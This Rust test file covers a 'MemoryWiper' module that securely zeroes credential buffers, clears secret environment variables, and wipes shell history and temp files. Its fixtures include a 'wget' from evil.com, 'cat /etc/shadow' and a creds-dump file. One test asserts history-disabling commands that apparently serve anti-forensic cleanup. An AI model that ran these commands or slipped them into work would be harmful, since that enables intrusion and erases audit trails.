use crate::memory_wiper::*;
use std::collections::HashMap;

#[test]
fn test_memory_wiper_creation_with_defaults() {
    let wiper = MemoryWiper::with_defaults();
    let env = MemoryEnvironment::default();
    let report = wiper.execute(&env);
    assert!(report.buffer_wipes.is_empty());
    assert!(report.env_var_wipes.is_empty());
    assert!(report.history_wipes.is_empty());
    assert!(report.temp_file_wipes.is_empty());
    assert_eq!(report.total_bytes_wiped, 0);
    assert!(report.all_verified);
}

#[test]
fn test_wipe_credential_buffer() {
    let wiper = MemoryWiper::with_defaults();
    let env = MemoryEnvironment {
        buffers: vec![BufferDescriptor {
            label: "admin-password".to_string(),
            data_type: SensitiveDataType::Credential,
            size_bytes: 256,
            address: 0x7fff_0000_1000,
            contents_pattern: BufferContentsPattern::AsciiPrintable,
        }],
        mlock_available: true,
        volatile_write_available: true,
        ..Default::default()
    };

    let report = wiper.execute(&env);
    assert_eq!(report.buffer_wipes.len(), 1);
    let record = &report.buffer_wipes[0];
    assert_eq!(record.target.label, "admin-password");
    assert_eq!(record.target.data_type, SensitiveDataType::Credential);
    assert_eq!(record.pattern_used, WipePattern::GutmannThreePass);
    assert_eq!(record.passes, 3);
    assert_eq!(record.result, WipeResult::Success);
    assert!(record.verification_passed);
    assert!(record.target.locked);
}

#[test]
fn test_wipe_crypto_key_buffer() {
    let wiper = MemoryWiper::with_defaults();
    let env = MemoryEnvironment {
        buffers: vec![BufferDescriptor {
            label: "aes-256-key".to_string(),
            data_type: SensitiveDataType::CryptoKey,
            size_bytes: 32,
            address: 0x7fff_0000_2000,
            contents_pattern: BufferContentsPattern::HighEntropy,
        }],
        mlock_available: true,
        volatile_write_available: true,
        ..Default::default()
    };

    let report = wiper.execute(&env);
    assert_eq!(report.buffer_wipes.len(), 1);
    let record = &report.buffer_wipes[0];
    assert_eq!(record.pattern_used, WipePattern::DoD522022M);
    assert_eq!(record.passes, 3);
    assert_eq!(record.result, WipeResult::Success);
}

#[test]
fn test_wipe_session_token_volatile_zero() {
    let wiper = MemoryWiper::with_defaults();
    let env = MemoryEnvironment {
        buffers: vec![BufferDescriptor {
            label: "jwt-token".to_string(),
            data_type: SensitiveDataType::SessionToken,
            size_bytes: 512,
            address: 0x7fff_0000_3000,
            contents_pattern: BufferContentsPattern::AsciiPrintable,
        }],
        mlock_available: false,
        volatile_write_available: true,
        ..Default::default()
    };

    let report = wiper.execute(&env);
    let record = &report.buffer_wipes[0];
    assert_eq!(record.pattern_used, WipePattern::VolatileZero);
    assert_eq!(record.passes, 1);
    assert!(!record.target.locked);
}

#[test]
fn test_zero_size_buffer_skipped() {
    let wiper = MemoryWiper::with_defaults();
    let env = MemoryEnvironment {
        buffers: vec![BufferDescriptor {
            label: "empty".to_string(),
            data_type: SensitiveDataType::Plaintext,
            size_bytes: 0,
            address: 0,
            contents_pattern: BufferContentsPattern::AllZeros,
        }],
        ..Default::default()
    };

    let report = wiper.execute(&env);
    assert_eq!(report.buffer_wipes[0].result, WipeResult::Skipped);
}

#[test]
fn test_multiple_buffers_all_wiped() {
    let wiper = MemoryWiper::with_defaults();
    let env = MemoryEnvironment {
        buffers: vec![
            BufferDescriptor {
                label: "key1".to_string(),
                data_type: SensitiveDataType::CryptoKey,
                size_bytes: 32,
                address: 0x1000,
                contents_pattern: BufferContentsPattern::HighEntropy,
            },
            BufferDescriptor {
                label: "pass1".to_string(),
                data_type: SensitiveDataType::Credential,
                size_bytes: 64,
                address: 0x2000,
                contents_pattern: BufferContentsPattern::AsciiPrintable,
            },
            BufferDescriptor {
                label: "token1".to_string(),
                data_type: SensitiveDataType::SessionToken,
                size_bytes: 128,
                address: 0x3000,
                contents_pattern: BufferContentsPattern::AsciiPrintable,
            },
        ],
        mlock_available: true,
        volatile_write_available: true,
        ..Default::default()
    };

    let report = wiper.execute(&env);
    assert_eq!(report.buffer_wipes.len(), 3);
    assert!(report.total_bytes_wiped > 0);
    for record in &report.buffer_wipes {
        assert_eq!(record.result, WipeResult::Success);
    }
}

#[test]
fn test_sensitive_env_var_detection() {
    let wiper = MemoryWiper::with_defaults();
    let mut env_vars = HashMap::new();
    env_vars.insert("DB_PASSWORD".to_string(), "s3cret123".to_string());
    env_vars.insert("AWS_SECRET_ACCESS_KEY".to_string(), "AKIA...".to_string());
    env_vars.insert("JWT_SECRET".to_string(), "mysupersecret".to_string());
    env_vars.insert("HOME".to_string(), "/root".to_string());
    env_vars.insert("PATH".to_string(), "/usr/bin".to_string());
    env_vars.insert("API_KEY".to_string(), "key-12345".to_string());
    env_vars.insert("SESSION_TOKEN".to_string(), "tok-abcde".to_string());

    let env = MemoryEnvironment {
        environment_variables: env_vars,
        ..Default::default()
    };

    let report = wiper.execute(&env);
    assert!(report.env_var_wipes.len() >= 4);
    for cleared in &report.env_var_wipes {
        assert!(cleared.cleared);
        assert!(cleared.value_length > 0);
    }

    let cleared_names: Vec<&str> = report
        .env_var_wipes
        .iter()
        .map(|e| e.name.as_str())
        .collect();
    assert!(cleared_names.contains(&"DB_PASSWORD"));
    assert!(cleared_names.contains(&"AWS_SECRET_ACCESS_KEY"));
    assert!(cleared_names.contains(&"JWT_SECRET"));
    assert!(!cleared_names.contains(&"HOME"));
    assert!(!cleared_names.contains(&"PATH"));
}

#[test]
fn test_env_var_classification() {
    let wiper = MemoryWiper::with_defaults();
    let mut env_vars = HashMap::new();
    env_vars.insert("ENCRYPTION_KEY".to_string(), "k".to_string());
    env_vars.insert("DB_PASSWORD".to_string(), "p".to_string());
    env_vars.insert("SESSION_TOKEN".to_string(), "t".to_string());

    let env = MemoryEnvironment {
        environment_variables: env_vars,
        ..Default::default()
    };

    let report = wiper.execute(&env);
    for var in &report.env_var_wipes {
        match var.name.as_str() {
            "ENCRYPTION_KEY" => assert_eq!(var.data_type, SensitiveDataType::CryptoKey),
            "DB_PASSWORD" => assert_eq!(var.data_type, SensitiveDataType::Credential),
            "SESSION_TOKEN" => assert_eq!(var.data_type, SensitiveDataType::SessionToken),
            _ => {}
        }
    }
}

#[test]
fn test_shell_history_wipe() {
    let wiper = MemoryWiper::with_defaults();
    let env = MemoryEnvironment {
        shell_history_files: vec![
            (
                ShellHistorySource::BashHistory,
                "/root/.bash_history".to_string(),
                vec![
                    "ssh root@10.0.0.1".to_string(),
                    "cat /etc/shadow".to_string(),
                    "wget http://evil.com/payload.sh".to_string(),
                ],
            ),
            (
                ShellHistorySource::ZshHistory,
                "/home/user/.zsh_history".to_string(),
                vec![],
            ),
        ],
        ..Default::default()
    };

    let report = wiper.execute(&env);
    assert_eq!(report.history_wipes.len(), 2);

    let bash = &report.history_wipes[0];
    assert_eq!(bash.source, ShellHistorySource::BashHistory);
    assert_eq!(bash.entries_found, 3);
    assert_eq!(bash.entries_wiped, 3);
    assert_eq!(bash.result, WipeResult::Success);

    let zsh = &report.history_wipes[1];
    assert_eq!(zsh.entries_found, 0);
    assert_eq!(zsh.result, WipeResult::Skipped);
}

#[test]
fn test_temp_file_wipe() {
    let wiper = MemoryWiper::with_defaults();
    let env = MemoryEnvironment {
        temp_files: vec![
            ("/tmp/aegis-scan-results.json".to_string(), 4096),
            ("/tmp/creds-dump.txt".to_string(), 1024),
            ("/dev/shm/session-cache".to_string(), 0),
        ],
        ..Default::default()
    };

    let report = wiper.execute(&env);
    assert_eq!(report.temp_file_wipes.len(), 3);
    assert_eq!(report.temp_file_wipes[0].result, WipeResult::Success);
    assert_eq!(report.temp_file_wipes[0].passes, 3);
    assert_eq!(
        report.temp_file_wipes[0].pattern_used,
        WipePattern::DoD522022M
    );
    assert_eq!(report.temp_file_wipes[2].result, WipeResult::Skipped);
}

#[test]
fn test_secure_zero_pattern_generation() {
    let pattern = MemoryWiper::secure_zero_pattern();
    assert!(pattern.contains("write_volatile"));
    assert!(pattern.contains("SeqCst"));
    assert!(pattern.contains("secure_zero"));
}

#[test]
fn test_mlock_pattern_generation() {
    let pattern = MemoryWiper::mlock_pattern();
    assert!(pattern.contains("mlock"));
    assert!(pattern.contains("munlock"));
    assert!(pattern.contains("libc"));
}

#[test]
fn test_dod_pattern_generation() {
    let pattern = MemoryWiper::dod_522022m_pattern();
    assert!(pattern.contains("Pass 1"));
    assert!(pattern.contains("Pass 2"));
    assert!(pattern.contains("Pass 3"));
    assert!(pattern.contains("0x00"));
    assert!(pattern.contains("0xFF"));
}

#[test]
fn test_histfile_manipulation_commands() {
    let commands = MemoryWiper::histfile_manipulation_commands();
    assert!(commands.len() >= 8);
    assert!(commands.contains(&"unset HISTFILE".to_string()));
    assert!(commands.contains(&"export HISTSIZE=0".to_string()));
    assert!(commands.contains(&"set +o history".to_string()));
}

#[test]
fn test_swap_disable_commands() {
    let commands = MemoryWiper::swap_disable_commands();
    assert!(!commands.is_empty());
    assert!(commands.iter().any(|c| c.contains("swapoff")));
}

#[test]
fn test_known_history_paths() {
    let paths = MemoryWiper::known_history_paths();
    assert!(paths.len() >= 5);
    assert!(paths
        .iter()
        .any(|(s, _)| *s == ShellHistorySource::BashHistory));
    assert!(paths
        .iter()
        .any(|(s, _)| *s == ShellHistorySource::PowerShellHistory));
}

#[test]
fn test_known_temp_directories() {
    let dirs = MemoryWiper::known_temp_directories();
    assert!(dirs.len() >= 3);
    assert!(dirs.contains(&"/tmp"));
    assert!(dirs.contains(&"/dev/shm"));
}

#[test]
fn test_dod_pass_values() {
    let passes = MemoryWiper::dod_pass_values();
    assert_eq!(passes.len(), 3);
    assert_eq!(passes[0].0, 0x00);
    assert_eq!(passes[1].0, 0xFF);
}

#[test]
fn test_custom_config() {
    let config = MemoryWiperConfig {
        default_pattern: WipePattern::RandomFill,
        dod_passes: 7,
        verify_after_wipe: false,
        wipe_env_vars: false,
        wipe_shell_history: false,
        wipe_temp_files: false,
        use_mlock: false,
        disable_swap: false,
        sensitive_env_patterns: vec!["CUSTOM_SECRET".to_string()],
    };
    let wiper = MemoryWiper::new(config);

    let mut env_vars = HashMap::new();
    env_vars.insert("DB_PASSWORD".to_string(), "x".to_string());
    env_vars.insert("CUSTOM_SECRET".to_string(), "y".to_string());

    let env = MemoryEnvironment {
        environment_variables: env_vars,
        shell_history_files: vec![(
            ShellHistorySource::BashHistory,
            "/root/.bash_history".to_string(),
            vec!["cmd".to_string()],
        )],
        temp_files: vec![("/tmp/test".to_string(), 100)],
        ..Default::default()
    };

    let report = wiper.execute(&env);
    assert!(report.env_var_wipes.is_empty());
    assert!(report.history_wipes.is_empty());
    assert!(report.temp_file_wipes.is_empty());
}

#[test]
fn test_full_wipe_report_integration() {
    let wiper = MemoryWiper::with_defaults();
    let mut env_vars = HashMap::new();
    env_vars.insert("SECRET_KEY".to_string(), "abc123".to_string());

    let env = MemoryEnvironment {
        buffers: vec![
            BufferDescriptor {
                label: "rsa-private".to_string(),
                data_type: SensitiveDataType::PrivateKey,
                size_bytes: 2048,
                address: 0xA000,
                contents_pattern: BufferContentsPattern::HighEntropy,
            },
            BufferDescriptor {
                label: "api-token".to_string(),
                data_type: SensitiveDataType::ApiSecret,
                size_bytes: 64,
                address: 0xB000,
                contents_pattern: BufferContentsPattern::AsciiPrintable,
            },
        ],
        environment_variables: env_vars,
        shell_history_files: vec![(
            ShellHistorySource::BashHistory,
            "/root/.bash_history".to_string(),
            vec!["curl -H 'Authorization: Bearer tok'".to_string()],
        )],
        temp_files: vec![("/tmp/scan.json".to_string(), 8192)],
        mlock_available: true,
        volatile_write_available: true,
        ..Default::default()
    };

    let report = wiper.execute(&env);
    assert_eq!(report.buffer_wipes.len(), 2);
    assert!(!report.env_var_wipes.is_empty());
    assert_eq!(report.history_wipes.len(), 1);
    assert_eq!(report.temp_file_wipes.len(), 1);
    assert!(report.total_bytes_wiped > 0);
    assert!(report.total_passes > 0);
}

#[test]
fn test_wipe_pattern_display() {
    assert_eq!(format!("{}", WipePattern::DoD522022M), "DoD-5220.22-M");
    assert_eq!(format!("{}", WipePattern::VolatileZero), "volatile-zero");
    assert_eq!(
        format!("{}", WipePattern::GutmannThreePass),
        "gutmann-3pass"
    );
    assert_eq!(format!("{}", WipePattern::ZeroFill), "zero-fill");
    assert_eq!(format!("{}", WipePattern::OneFill), "one-fill");
    assert_eq!(format!("{}", WipePattern::RandomFill), "random-fill");
}

#[test]
fn test_wipe_result_display() {
    assert_eq!(format!("{}", WipeResult::Success), "success");
    assert_eq!(format!("{}", WipeResult::PartialSuccess), "partial-success");
    assert_eq!(format!("{}", WipeResult::Failed), "failed");
    assert_eq!(format!("{}", WipeResult::Skipped), "skipped");
}

#[test]
fn test_sensitive_data_type_display() {
    assert_eq!(format!("{}", SensitiveDataType::Credential), "credential");
    assert_eq!(format!("{}", SensitiveDataType::CryptoKey), "crypto-key");
    assert_eq!(format!("{}", SensitiveDataType::PrivateKey), "private-key");
    assert_eq!(
        format!("{}", SensitiveDataType::SessionToken),
        "session-token"
    );
    assert_eq!(format!("{}", SensitiveDataType::ApiSecret), "api-secret");
    assert_eq!(
        format!("{}", SensitiveDataType::DatabasePassword),
        "database-password"
    );
    assert_eq!(format!("{}", SensitiveDataType::Plaintext), "plaintext");
}

#[test]
fn test_shell_history_source_display() {
    assert_eq!(
        format!("{}", ShellHistorySource::BashHistory),
        "bash-history"
    );
    assert_eq!(format!("{}", ShellHistorySource::ZshHistory), "zsh-history");
    assert_eq!(
        format!("{}", ShellHistorySource::FishHistory),
        "fish-history"
    );
    assert_eq!(
        format!("{}", ShellHistorySource::PowerShellHistory),
        "powershell-history"
    );
    assert_eq!(format!("{}", ShellHistorySource::CmdHistory), "cmd-history");
    assert_eq!(
        format!("{}", ShellHistorySource::PythonHistory),
        "python-history"
    );
    assert_eq!(
        format!("{}", ShellHistorySource::SqliteHistory),
        "sqlite-history"
    );
}

#[test]
fn test_mlock_not_available_buffer_not_locked() {
    let wiper = MemoryWiper::with_defaults();
    let env = MemoryEnvironment {
        buffers: vec![BufferDescriptor {
            label: "key".to_string(),
            data_type: SensitiveDataType::CryptoKey,
            size_bytes: 32,
            address: 0x1000,
            contents_pattern: BufferContentsPattern::HighEntropy,
        }],
        mlock_available: false,
        volatile_write_available: true,
        ..Default::default()
    };

    let report = wiper.execute(&env);
    assert!(!report.buffer_wipes[0].target.locked);
}
